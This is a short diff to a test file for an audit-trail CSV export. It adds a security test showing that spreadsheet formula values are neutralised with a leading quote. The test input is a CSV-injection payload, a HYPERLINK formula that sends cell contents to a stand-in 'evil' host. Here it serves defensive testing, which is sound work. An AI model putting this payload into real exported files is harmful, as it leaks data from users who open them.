@@ -211,5 +211,8 @@ describe('Activity & integrations rules (plumbKpis / actChips / actRows / connRo
     ]);
     expect(auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet'])).toBe('Quand (UTC),Qui,Objet,Modification,Domaine,Projet\r\n');
     expect(auditCsvFileName('2026-10-09')).toBe('keystone-audit-trail-2026-10-09.csv');
+    // Security review: a value a spreadsheet would run as a formula is neutralised with a leading quote.
+    const evil = auditCsv([{ occurredAt: '2026-09-25T07:12:00.000Z', who: '@x', object: '=HYPERLINK("https://evil/?d="&A2,"x")', change: '+1', area: '-2', projectCode: null }]);
+    expect(evil.split('\r\n')[1]).toBe(`2026-09-25T07:12:00.000Z,'@x,"'=HYPERLINK(""https://evil/?d=""&A2,""x"")",'+1,'-2,`);
   });
 });
